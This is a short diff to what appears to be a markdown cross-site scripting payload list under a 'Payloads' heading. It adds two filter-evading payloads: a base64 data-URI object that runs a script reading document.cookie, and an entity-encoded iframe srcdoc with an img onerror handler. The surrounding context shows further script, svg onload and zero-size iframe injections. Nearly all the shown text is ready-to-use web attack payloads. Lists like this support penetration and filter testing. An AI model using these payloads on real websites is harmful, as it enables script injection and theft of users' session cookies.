@@ -8,6 +8,8 @@ Payloads
 <script>alert(123123)</script>
 <script>alert(document.cookie)</script>
 <svg onload=alert(1)>
+"/><object data="data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpOzwvc2NyaXB0Pg==
+"/><iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;" />
 ```
 
 iframe: `<iframe src="http://www.cnn.com" height = "0" width = "0"></iframe>`  
